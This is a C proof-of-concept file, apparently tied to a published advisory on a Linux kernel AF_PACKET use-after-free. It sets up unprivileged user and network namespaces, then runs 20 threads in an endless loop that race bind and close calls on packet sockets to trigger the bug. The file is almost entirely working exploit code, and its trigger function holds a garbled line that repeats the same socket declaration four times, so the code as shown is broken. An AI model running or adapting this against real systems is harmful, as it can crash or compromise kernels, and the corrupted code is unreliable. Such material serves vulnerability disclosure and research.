// https://ssd-disclosure.com/ssd-advisory-linux-kernel-af_packet-use-after-free-2/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}
void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();
	if (unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("sched_setaffinity()");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ip link set dev lo up") != 0) {
		perror("system(/sbin/ip link set dev lo up)");
		exit(EXIT_FAILURE);
	}
	printf("[.] namespace sandbox setup successfully\n");
}
void *trigger(void *unused)
{
	struct ifreq ifreq;
	struct sockaddr_ll addr1, addr2;
	int index;
	int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);int fd = socket(AF_PACKET, SOCK_DGRAM, PF_PACKET);
	memcpy(&ifreq.ifr_name, "lo", 3);
	ioctl(fd, SIOCSIFFLAGS, &ifreq);
	ifreq.ifr_flags = IFF_UP;
	ioctl(fd, SIOCSIFFLAGS, &ifreq);
	ioctl(fd, SIOCGIFINDEX, &ifreq);
	index = ifreq.ifr_ifindex;
	addr1.sll_family = AF_PACKET;
	addr1.sll_ifindex = index;
	bind(fd, (struct sockaddr *)&addr1, sizeof(addr1));
	addr2.sll_family = AF_PACKET;
	bind(fd, (struct sockaddr *)&addr2, sizeof(addr2));
	close(fd);
}
#define NB_T 20
int main()
{
	int i;
	setup_sandbox();
	do {
		pthread_t trigger_tasks[NB_T];
		for (i = 0; i < NB_T; ++i)
			pthread_create(&trigger_tasks[i], NULL, trigger, NULL);
		for (i = 0; i < NB_T; ++i)
			pthread_join(trigger_tasks[i], NULL);
	} while (1);
	return 0;
}
